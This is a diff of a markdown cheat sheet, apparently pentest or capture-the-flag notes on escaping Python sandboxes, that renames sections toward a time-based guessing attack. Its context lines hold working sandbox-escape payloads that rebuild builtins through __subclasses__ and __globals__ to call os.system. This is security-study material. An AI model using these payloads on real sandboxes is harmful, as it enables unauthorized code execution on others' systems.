@@ -104,7 +104,9 @@ get_flag.__globals__['__builtins__'].__import__("os").system("ls")
 {% endtab %}
 {% endtabs %}
 
-## Time Commands list
+## Time Based Guessing Attack
+
+### Python Time commands
 
 * Ref : [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes\#executing-python-code](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#executing-python-code)
 
@@ -124,7 +126,7 @@ i={}\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\
 
 ```
 
-## Restore builtins and execute OS command \(no limit on characters\)
+### Restore builtins and execute time based python command \(no limit on characters\)
 
 * [https://github.com/nEcr0tik/htb/tree/master/mine-scripts/Python\_Sandbox/Python2](https://github.com/nEcr0tik/htb/tree/master/mine-scripts/Python_Sandbox/Python2)
 
@@ -195,7 +197,7 @@ for file_index in range(0,ndir):                             # This will be on a
 ().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
 ```
 
-## Limiting commands to 300 characters
+### Restore builtins and execute time based python command \(characters limited to 300\)
 
 ```text
 
